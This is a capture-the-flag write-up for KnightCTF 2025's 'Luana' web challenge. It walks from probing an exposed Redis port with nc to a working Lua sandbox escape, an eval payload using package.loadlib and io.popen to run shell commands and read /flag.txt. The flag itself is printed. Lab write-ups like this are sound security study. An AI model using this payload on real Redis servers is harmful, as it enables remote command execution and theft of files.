---
title: "Luana"
description: "Show me your skills. Read the /flag.txt"
pubDate: 2025-01-22
ctf: "KnightCTF 2025"
category: "web"
author: "sealldev"
section: "CTFs"
image: "images/25-knight/icon.png"
---



We are given a webserver that notifies the service has started on port `6379`, looking into that port it is **Redis**. I'd heard of it before but never really used it. We are also told the flag is stored at `/flag.txt`.

> Redis is a source-available, in-memory storage, used as a distributed, in-memory key–value database, cache and message broker, with optional durability.

I start with some basic commands such as `set` and `get` through `nc`

```
$ nc server 6379
> set 0 1
> get 0
1
```

Looking into Redis on [HackTricks](https://book.hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html) I notice that it mentions a LUA Sandbox Escape that's usually patched.

Thinking of the title of the challenge **Lua**na I think I know where to look.

Looking at recent CVE's in Redis I find one that's a [Lua sandbox escape from 2022](https://ine.com/blog/cve-20220543-lua-sandbox-escape-in-redis) and make a payload according to the blog.

```
eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("cat /flag.txt", "r"); local res = f:read("*a"); f:close(); return res' 0
```

Flag: `KCTF{c0n6r475_b015_n1c3_c47ch}`
